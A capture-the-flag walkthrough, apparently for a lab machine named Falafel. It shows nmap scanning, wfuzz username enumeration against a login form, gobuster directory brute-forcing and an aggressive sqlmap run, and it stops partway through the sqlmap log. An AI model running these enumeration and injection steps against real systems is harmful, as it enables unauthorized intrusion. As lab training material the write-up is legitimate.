#### Falafet

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Web Enumeration](#web-enumeration)
- [SQL Injection](#sql-injection)
- [PHP Type Juggling](#php-type-juggling)
- [Wget exploit and file name size exploit](#wget-exploit-and-file-name-size-exploit)
- [Reverse Shell](#reverse-shell)
- [User flag](#user-flag)
- [Privilege Escalation using debugfs](#privilege-escalation-using-debugfs)
- [Manual SQL Injection](#manual-sql-injection)

###### Attacker Info

```sh
root@kali:~/falafet# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:b0:a9:19 brd ff:ff:ff:ff:ff:ff
    inet 192.168.150.18/24 brd 192.168.150.255 scope global dynamic noprefixroute eth0
       valid_lft 83454sec preferred_lft 83454sec
    inet6 fe80::20c:29ff:feb0:a919/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none
    inet 10.10.14.16/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::100e/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::126a:dc41:185e:f505/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
root@kali:~/falafet#
```

###### Nmap Scan

```sh
root@kali:~/falafet# nmap -sC -sV -oA falafet.nmap 10.10.10.73
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-24 15:55 EDT
Nmap scan report for 10.10.10.73
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)
|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)
|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/*.txt
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Falafel Lovers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.78 seconds
root@kali:~/falafet#
```

![](images/1.png)

![](images/2.png)

###### Web Enumeration

```
http://10.10.10.73/
http://10.10.10.73/login.php
```

![](images/3.png)

![](images/4.png)

![](images/5.png)

```
username=admin&password=password
```

```sh
root@kali:~/falafet# git clone https://github.com/danielmiessler/SecLists.git
Cloning into 'SecLists'...
remote: Counting objects: 2697, done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 2697 (delta 2), reused 12 (delta 1), pack-reused 2678
Receiving objects: 100% (2697/2697), 436.36 MiB | 7.01 MiB/s, done.
Resolving deltas: 100% (1220/1220), done.
Checking out files: 100% (683/683), done.
root@kali:~/falafet#
```

```sh
root@kali:~/falafet# cp SecLists/Usernames/Names/names.txt .
```

```sh
root@kali:~/falafet# wfuzz -c -z file,names.txt --sc 200 -d "username=FUZZ&password=password" http://10.10.10.73/login.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.73/login.php
Total requests: 10163

==================================================================
ID	Response   Lines      Word         Chars          Payload
==================================================================

000023:  C=200    102 L	     657 W	   7074 Ch	  "abi"
000024:  C=200    102 L	     657 W	   7074 Ch	  "abia"
000025:  C=200    102 L	     657 W	   7074 Ch	  "abigael"
000026:  C=200    102 L	     657 W	   7074 Ch	  "abigail"
000001:  C=200    102 L	     657 W	   7074 Ch	  "aaliyah"
000002:  C=200    102 L	     657 W	   7074 Ch	  "aaren"
000003:  C=200    102 L	     657 W	   7074 Ch	  "aarika"
000004:  C=200    102 L	     657 W	   7074 Ch	  "aaron"
000005:  C=200    102 L	     657 W	   7074 Ch	  "aartjan"
000006:  C=200    102 L	     657 W	   7074 Ch	  "aarushi"
000027:  C=200    102 L	     657 W	   7074 Ch	  "abigale"
000028:  C=200    102 L	     657 W	   7074 Ch	  "abra"
000029:  C=200    102 L	     657 W	   7074 Ch	  "abraham"
000030:  C=200    102 L	     657 W	   7074 Ch	  "abram"
000031:  C=200    102 L	     657 W	   7074 Ch	  "abree"
000032:  C=200    102 L	     657 W	   7074 Ch	  "abrianna"
000033:  C=200    102 L	     657 W	   7074 Ch	  "abriel"
000034:  C=200    102 L	     657 W	   7074 Ch	  "abrielle"
000035:  C=200    102 L	     657 W	   7074 Ch	  "abu"
000036:  C=200    102 L	     657 W	   7074 Ch	  "aby"
000079:  C=200    102 L	     657 W	   7074 Ch	  "adeniyi"
000037:  C=200    102 L	     657 W	   7074 Ch	  "acacia"
000038:  C=200    102 L	     657 W	   7074 Ch	  "access"
000039:  C=200    102 L	     657 W	   7074 Ch	  "accounting"
000040:  C=200    102 L	     657 W	   7074 Ch	  "ace"
000041:  C=200    102 L	     657 W	   7074 Ch	  "achal"
000042:  C=200    102 L	     657 W	   7074 Ch	  "achamma"
000043:  C=200    102 L	     657 W	   7074 Ch	  "action"
000044:  C=200    102 L	     657 W	   7074 Ch	  "ada"
000045:  C=200    102 L	     657 W	   7074 Ch	  "adah"
000080:  C=200    102 L	     657 W	   7074 Ch	  "adey"
000089:  C=200    102 L	     657 W	   7074 Ch	  "adonis"
000086:  C=200    102 L	     659 W	   7091 Ch	  "admin"
000085:  C=200    102 L	     657 W	   7074 Ch	  "aditya"
000088:  C=200    102 L	     657 W	   7074 Ch	  "adon"
000046:  C=200    102 L	     657 W	   7074 Ch	  "adair"
000047:  C=200    102 L	     657 W	   7074 Ch	  "adalia"
000048:  C=200    102 L	     657 W	   7074 Ch	  "adaline"
000049:  C=200    102 L	     657 W	   7074 Ch	  "adalyn"
000050:  C=200    102 L	     657 W	   7074 Ch	  "adam"
000093:  C=200    102 L	     657 W	   7074 Ch	  "adorne"
000090:  C=200    102 L	     657 W	   7074 Ch	  "adora"
000094:  C=200    102 L	     657 W	   7074 Ch	  "adrea"
000051:  C=200    102 L	     657 W	   7074 Ch	  "adan"
000052:  C=200    102 L	     657 W	   7074 Ch	  "adara"
000053:  C=200    102 L	     657 W	   7074 Ch	  "adda"
000096:  C=200    102 L	     657 W	   7074 Ch	  "adri"
000098:  C=200    102 L	     657 W	   7074 Ch	  "adriaens"
000097:  C=200    102 L	     657 W	   7074 Ch	  "adria"
000054:  C=200    102 L	     657 W	   7074 Ch	  "addi"
000101:  C=200    102 L	     657 W	   7074 Ch	  "adriane"
000100:  C=200    102 L	     657 W	   7074 Ch	  "adriana"
000108:  C=200    102 L	     657 W	   7074 Ch	  "adrienne"
000107:  C=200    102 L	     657 W	   7074 Ch	  "adriena"
000104:  C=200    102 L	     657 W	   7074 Ch	  "adrie"
000103:  C=200    102 L	     657 W	   7074 Ch	  "adrianne"
000055:  C=200    102 L	     657 W	   7074 Ch	  "addia"
000056:  C=200    102 L	     657 W	   7074 Ch	  "addie"
000057:  C=200    102 L	     657 W	   7074 Ch	  "addilyn"
000058:  C=200    102 L	     657 W	   7074 Ch	  "addison"
^C
Finishing pending requests...
root@kali:~/falafet#
```

```sh
root@kali:~/falafet# wfuzz --help

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
*                                                      *
* Version up to 1.4c coded by:                         *
* Christian Martorella (cmartorella@edge-security.com) *
* Carlos del ojo (deepbit@gmail.com)                   *
*                                                      *
* Version 1.4d to 2.2.11 coded by:                     *
* Xavier Mendez (xmendez@edge-security.com)            *
********************************************************

Usage:	wfuzz [options] -z payload,params <url>

	FUZZ, ..., FUZnZ  wherever you put these keywords wfuzz will replace them with the values of the specified payload.
	FUZZ{baseline_value} FUZZ will be replaced by baseline_value. It will be the first request performed and could be used as a base for filtering.


Options:
	-h/--help		    : This help
	--help			    : Advanced help
	--version		    : Wfuzz version details
	-e <type>		    : List of available encoders/payloads/iterators/printers/scripts

	--recipe <filename>	    : Reads options from a recipe
	--dump-recipe <filename>    : Prints current options as a recipe
	--oF <filename>   	    : Saves fuzz results to a file. These can be consumed later using the wfuzz payload.

	-c			    : Output with colors
	-v			    : Verbose information.
	-f filename,printer         : Store results in the output file using the specified printer (raw printer if omitted).
	-o printer                  : Show results using the specified printer.
	--interact		    : (beta) If selected,all key presses are captured. This allows you to interact with the program.
	--dry-run		    : Print the results of applying the requests without actually making any HTTP request.
	--prev    		    : Print the previous HTTP requests (only when using payloads generating fuzzresults)

	-p addr			    : Use Proxy in format ip:port:type. Repeat option for using various proxies.
				      Where type could be SOCKS4,SOCKS5 or HTTP if omitted.

	-t N			    : Specify the number of concurrent connections (10 default)
	-s N			    : Specify time delay between requests (0 default)
	-R depth		    : Recursive path discovery being depth the maximum recursion level.
	-L,--follow		    : Follow HTTP redirections
	-Z			    : Scan mode (Connection errors will be ignored).
	--req-delay N		    : Sets the maximum time in seconds the request is allowed to take (CURLOPT_TIMEOUT). Default 90.
	--conn-delay N              : Sets the maximum time in seconds the connection phase to the server to take (CURLOPT_CONNECTTIMEOUT). Default 90.

	-A			    : Alias for --script=default -v -c
	--script=		    : Equivalent to --script=default
	--script=<plugins>	    : Runs script's scan. <plugins> is a comma separated list of plugin-files or plugin-categories
	--script-help=<plugins>	    : Show help about scripts.
	--script-args n1=v1,...     : Provide arguments to scripts. ie. --script-args grep.regex="<A href=\"(.*?)\">"

	-u url                      : Specify a URL for the request.
	-m iterator		    : Specify an iterator for combining payloads (product by default)
	-z payload		    : Specify a payload for each FUZZ keyword used in the form of name[,parameter][,encoder].
				      A list of encoders can be used, ie. md5-sha1. Encoders can be chained, ie. md5@sha1.
				      Encoders category can be used. ie. url
	                              Use help as a payload to show payload plugin's details (you can filter using --slice)
	--zP <params>		    : Arguments for the specified payload (it must be preceded by -z or -w).
	--slice <filter>	    : Filter payload's elements using the specified expression. It must be preceded by -z.
	-w wordlist		    : Specify a wordlist file (alias for -z file,wordlist).
	-V alltype		    : All parameters bruteforcing (allvars and allpost). No need for FUZZ keyword.
	-X method		    : Specify an HTTP method for the request, ie. HEAD or FUZZ

	-b cookie		    : Specify a cookie for the requests. Repeat option for various cookies.
	-d postdata 		    : Use post data (ex: "id=FUZZ&catalogue=1")
	-H header  		    : Use header (ex:"Cookie:id=1312321&user=FUZZ"). Repeat option for various headers.
	--basic/ntlm/digest auth    : in format "user:pass" or "FUZZ:FUZZ" or "domain\FUZ2Z:FUZZ"

	--hc/hl/hw/hh N[,N]+	    : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
	--sc/sl/sw/sh N[,N]+	    : Show responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
	--ss/hs regex		    : Show/hide responses with the specified regex within the content
	--filter <filter>	    : Show/hide responses using the specified filter expression (Use BBB for taking values from baseline)
	--prefilter <filter>	    : Filter items before fuzzing using the specified expression.

root@kali:~/falafet#
```

```sh
root@kali:~/falafet# wfuzz -c -z file,names.txt --hw 657 -d "username=FUZZ&password=password" http://10.10.10.73/login.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.73/login.php
Total requests: 10163

==================================================================
ID	Response   Lines      Word         Chars          Payload
==================================================================

000086:  C=200    102 L	     659 W	   7091 Ch	  "admin"
001883:  C=200    102 L	     659 W	   7091 Ch	  "chris"

Total time: 193.8135
Processed Requests: 10163
Filtered Requests: 10161
Requests/sec.: 52.43698

root@kali:~/falafet#
```

```sh
root@kali:~/falafet# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -u http://10.10.10.73

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.73/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
[+] Extensions   : .txt,.php
=====================================================
/images (Status: 301)
/index.php (Status: 200)
/login.php (Status: 200)
/profile.php (Status: 302)
/uploads (Status: 301)
/header.php (Status: 200)
/assets (Status: 301)
/footer.php (Status: 200)
/upload.php (Status: 302)
/css (Status: 301)
/style.php (Status: 200)
/js (Status: 301)
/logout.php (Status: 302)
/robots.txt (Status: 200)
/cyberlaw.txt (Status: 200)
^C[!] Keyboard interrupt detected, terminating.
=====================================================
root@kali:~/falafet#
```

```
http://10.10.10.73/cyberlaw.txt
```

![](images/6.png)

###### SQL Injection

![](images/7.png)

![](images/8.png)

```sh
root@kali:~/falafet# cat login.req
POST /login.php HTTP/1.1
Host: 10.10.10.73
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.73/login.php
Cookie: PHPSESSID=qjajg7v527j5sounemt10poc53
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

username=admin&password=password


root@kali:~/falafet#
```

```sh
root@kali:~/falafet# sqlmap -r login.req --level 5 --risk 3 -p username,password --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:38:43

[16:38:43] [INFO] parsing HTTP request from 'login.req'
[16:38:43] [WARNING] provided parameters 'username, password' are not inside the Cookie
[16:38:43] [INFO] testing connection to the target URL
[16:38:44] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[16:38:44] [INFO] testing if the target URL content is stable
[16:38:45] [INFO] target URL content is stable
[16:38:45] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[16:38:45] [INFO] testing for SQL injection on POST parameter 'username'
[16:38:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:39:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[16:39:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[16:39:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)'
[16:39:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment)'
[16:40:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment) (NOT)'
[16:40:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:40:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:40:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)'
[16:40:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[16:40:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[16:41:05] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[16:41:22] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[16:41:41] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[16:41:57] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[16:42:15] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[16:42:32] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[16:42:50] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[16:43:07] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[16:43:25] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[16:43:41] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[16:43:59] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[16:44:15] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[16:44:15] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace (original value)'
[16:44:16] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace'
[16:44:16] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'
[16:44:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[16:44:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[16:44:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[16:44:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[16:44:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[16:44:18] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[16:44:18] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[16:44:18] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[16:44:19] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[16:44:19] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[16:44:20] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[16:44:20] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[16:44:20] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[16:44:21] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[16:44:21] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[16:44:22] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[16:44:22] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[16:44:23] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[16:44:23] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[16:44:23] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL) (original value)'
[16:44:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[16:44:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE) (original value)'
[16:44:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[16:44:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[16:44:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[16:44:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[16:44:26] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[16:44:27] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[16:44:28] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[16:44:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[16:44:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[16:44:30] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[16:44:31] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[16:44:32] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[16:44:33] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[16:44:34] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[16:44:34] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[16:44:35] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[16:44:51] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[16:44:51] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[16:45:07] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[16:45:24] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[16:45:40] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[16:45:56] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[16:46:12] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[16:46:28] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[16:46:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:46:55] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:47:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:47:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:47:28] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[16:47:39] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[16:47:50] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:48:00] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:48:09] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:48:20] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:48:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:48:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:48:52] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:49:02] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[16:49:13] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[16:49:20] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[16:49:31] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[16:49:40] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[16:49:51] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
[16:50:00] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[16:50:11] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'
[16:50:20] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[16:50:31] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'
[16:50:41] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[16:50:52] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
[16:51:01] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[16:51:11] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[16:51:21] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[16:51:32] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[16:51:42] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[16:51:53] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[16:52:01] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
[16:52:11] [INFO] testing 'Firebird OR error-based - WHERE or HAVING clause'
[16:52:19] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:52:27] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[16:52:28] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[16:52:28] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[16:52:28] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[16:52:28] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[16:52:28] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[16:52:29] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[16:52:29] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[16:52:29] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
[16:52:29] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'
[16:52:29] [INFO] testing 'Oracle error-based - Parameter replace'
[16:52:29] [INFO] testing 'Firebird error-based - Parameter replace'
[16:52:30] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[16:52:30] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[16:52:30] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[16:52:31] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[16:52:31] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[16:52:32] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[16:52:32] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[16:52:32] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[16:52:33] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[16:52:33] [INFO] testing 'Microsoft SQL Server/Sybase error-based - ORDER BY clause'
[16:52:33] [INFO] testing 'Oracle error-based - ORDER BY, GROUP BY clause'
[16:52:34] [INFO] testing 'Firebird error-based - ORDER BY clause'
[16:52:34] [INFO] testing 'MySQL inline queries'
[16:52:34] [INFO] testing 'PostgreSQL inline queries'
[16:52:35] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[16:52:35] [INFO] testing 'Oracle inline queries'
[16:52:35] [INFO] testing 'SQLite inline queries'
[16:52:35] [INFO] testing 'Firebird inline queries'
[16:52:35] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[16:52:42] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[16:52:53] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[16:53:01] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[16:53:12] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[16:53:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[16:53:32] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[16:53:41] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[16:53:51] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[16:53:59] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[16:54:09] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[16:54:17] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[16:54:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[16:54:37] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
[16:54:49] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[16:54:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)'
